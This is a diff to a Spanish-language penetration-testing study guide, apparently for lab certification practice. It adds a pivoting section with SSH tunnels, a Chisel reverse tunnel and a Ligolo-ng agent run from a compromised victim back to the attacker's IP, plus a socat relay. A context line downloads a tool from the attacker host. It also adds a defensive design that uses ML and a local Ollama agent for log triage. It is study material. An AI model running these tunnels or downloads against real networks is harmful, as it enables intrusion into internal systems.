@@ -234,6 +234,55 @@ flowchart LR
      Invoke-WebRequest -Uri http://<MI_IP>/tool.exe -OutFile tool.exe
      ```
 
+4. **Pivoting, Túneles y Redirección de Puertos (Port Forwarding):**
+   *El pivoting es el arte de utilizar una máquina previamente comprometida con doble interfaz de red (multihomed) como trampolín para auditar y atacar segmentos de red internos inaccesibles desde el exterior:*
+   
+   - **Túneles SSH y Proxies SOCKS5 (Nativo):**
+     ```bash
+     # Local Port Forwarding: Traer un puerto interno (ej. MySQL 3306) a localhost:
+     ssh -L 3306:10.10.10.5:3306 usuario@<IP_PIVOTE>
+
+     # Dynamic Port Forwarding (Proxy SOCKS5 completo en puerto 1080):
+     ssh -D 1080 -N -f usuario@<IP_PIVOTE>
+
+     # Enrutamiento de herramientas a través del túnel con Proxychains:
+     # (Configurar 'socks5 127.0.0.1 1080' en /etc/proxychains4.conf)
+     proxychains4 nmap -sT -Pn -p 22,80,445 10.10.10.5
+     ```
+
+   - **Chisel (Túneles HTTP / WebSocket a través de Firewalls Restrictivos):**
+     *Ideal cuando la máquina comprometida no tiene servidor SSH o el firewall bloquea tráfico saliente salvo por el puerto 80/443:*
+     ```bash
+     # En tu máquina atacante (Servidor Chisel a la escucha):
+     ./chisel server -p 8080 --reverse
+
+     # En la máquina víctima comprometida (Cliente Chisel hacia el atacante):
+     ./chisel client <MI_IP>:8080 R:socks
+     # Crea un SOCKS5 inverso en localhost:1080 para usar con proxychains.
+     ```
+
+   - **Ligolo-ng (El Estándar Moderno de Pivoting por Interfaz TUN):**
+     *A diferencia de SOCKS5/Proxychains (que sufre de latencia y no soporta escaneos SYN ni paquetes UDP), Ligolo-ng crea una interfaz de red virtual real (TUN) a nivel de kernel:*
+     ```bash
+     # 1. En atacante: crear interfaz TUN y arrancar proxy
+     sudo ip tuntap add user $USER mode tun ligolo
+     sudo ip link set ligolo up
+     ./proxy -autocert -laddr 0.0.0.0:11601
+
+     # 2. En víctima: conectar el agente hacia tu proxy
+     ./agent -connect <MI_IP>:11601 -ignore-cert
+
+     # 3. En atacante: añadir la ruta del segmento interno al kernel Linux
+     sudo ip route add 10.10.10.0/24 dev ligolo
+     # ¡Ahora puedes hacer ping y nmap directo a 10.10.10.X sin proxychains!
+     ```
+
+   - **Redirección de Puertos con Socat (Port Relay):**
+     ```bash
+     # Redirigir el puerto 8080 de la máquina pivote hacia una web interna:
+     socat TCP-LISTEN:8080,fork,reuseaddr TCP:10.10.10.5:80
+     ```
+
 ---
 
 ### Nivel 5: Escalada de Privilegios (Linux & Windows) (Voltaje Máximo 🔥)
@@ -360,3 +409,41 @@ Guarda un archivo de notas Markdown por cada máquina que resuelvas (por ejemplo
   cat /root/proof.txt # o type C:\Users\Administrator\desktop\proof.txt
   ```
 ```
+
+---
+
+## 5. Arquitectura de Investigación de Maestría: Escaneo Perimetral, Machine Learning y Agentes de Ciberseguridad con Ollama
+
+```mermaid
+flowchart TD
+    subgraph "Capa 1: Ingesta Perimetral & Reconocimiento"
+        S1["Censys API & Shodan"] --> AGG["Normalizador de Activos"]
+        S2["Nmap / Masscan Automatizado"] --> AGG
+    end
+    subgraph "Capa 2: Telemetría de Servidores & Logs"
+        L1["Syslog / Auth.log / Wtmp"] --> PIPELINE["ETL & Feature Extraction"]
+        L2["Web Access Logs (Apache / IIS)"] --> PIPELINE
+        L3["Windows Event Logs (Sysmon / 4624)"] --> PIPELINE
+    end
+    AGG --> PIPELINE
+    subgraph "Capa 3: Núcleo de Machine Learning"
+        PIPELINE --> ML1["Detección de Anomalías\n(Isolation Forest / Autoencoders)"]
+        PIPELINE --> ML2["Clasificación de Amenazas\n(Random Forest / XGBoost)"]
+    end
+    subgraph "Capa 4: Agente Local de Razonamiento (Ollama)"
+        ML1 -- "Alertas No Concluyentes / Outliers" --> OLLAMA["Ollama LLM Agent\n(Modelos: Llama 3 / Mistral / DeepSeek)"]
+        ML2 -- "Correlación Compleja de IoCs" --> OLLAMA
+        OLLAMA --> SOC["Triage Automatizado & Recomendaciones de Hardening"]
+    end
+```
+
+### ¿Por qué dominar la ofensiva es el cimiento de la Inteligencia Artificial en Seguridad?
+Un modelo de Machine Learning o un Agente LLM en ciberseguridad es tan bueno como la **calidad de los datos de entrenamiento (Ground Truth)**. No es posible diseñar modelos de detección de anomalías ni evaluar la telemetría de un servidor si no se comprende con exactitud:
+1. **La firma real de un escaneo:** Cómo se diferencian en los logs de red y en Censys un escaneo TCP SYN furtivo de un barrido agresivo de Nmap o una auditoría con Masscan.
+2. **La huella de una Reverse Shell y Pivoting:** El tráfico generado por una conexión interactiva Netcat, un túnel cifrado de Chisel o una interfaz TUN de Ligolo-ng a nivel de sockets del sistema (`ss -tupan`).
+3. **Eventos de Escalada y Tokens:** Cómo se reflejan en los registros de auditoría de Linux (`auditd`) o de Windows (`EventID 4688` - Creación de procesos con privilegios elevados) el abuso de un binario SUID o la activación de `SeImpersonatePrivilege`.
+
+### Rol del Agente LLM Local con Ollama:
+* **Privacidad Estricta de Telemetría:** La información de servidores, puertos internos, vulnerabilidades y registros de auditoría corporativos **nunca debe ser transmitida a nubes públicas**. Ollama garantiza inferencia 100% local en hardware propio.
+* **Triage de Casos Borde (Outliers):** Los algoritmos clásicos de ML (como Isolation Forests) marcan eventos como anómalos pero carecen de contexto semántico. El agente de Ollama recibe el log exacto, el banner del servicio y el historial temporal para dictaminar si se trata de un falso positivo o de un intento activo de intrusión.
+* **Respuesta Asistida y Generación de Reglas:** Sugerencia automática de reglas de firewall (`iptables`, `Windows Defender Firewall`), políticas de hardening o firmas Sigma/Suricata en tiempo real.
